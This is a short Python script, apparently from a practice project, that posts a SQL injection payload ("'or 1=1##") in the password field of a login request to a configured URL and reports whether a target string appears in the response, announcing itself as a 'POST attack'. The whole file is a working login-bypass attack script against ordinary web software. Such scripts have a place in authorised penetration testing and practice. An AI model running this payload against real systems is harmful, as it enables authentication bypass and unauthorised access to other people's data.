import requests
from ScriptPrcatice.myrandom import *  # assuming payloads are imported
from ScriptPrcatice.Config import *  # assuming your config variables
import json


# POST Request Function
def PostRequest():
    print("POST attack started...........")

    url = Base_Url2 + Userinfo
    headers = {
        "Content-Type": "application/json"
        # "Authorization": Auth   # Uncomment if auth is needed
    }
    payload = "'or 1=1##"


    print(f"[*] Testing payload: {payload}")

    data = {
        "uname": "test",
        "pass": payload
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        rcode = response.status_code
        response_body = response.text

        print(f"Response Code: {rcode}")

        if target in response_body:
            report(payload)
            print("present")
        else:
            print("absent")

        print(f"Response Body:\n{response_body}")
        print("-" * 40)

    except Exception as e:
        print(f"Request failed: {str(e)}")

    print("POST attack ended...........")

if __name__ == "__main__":
    PostRequest()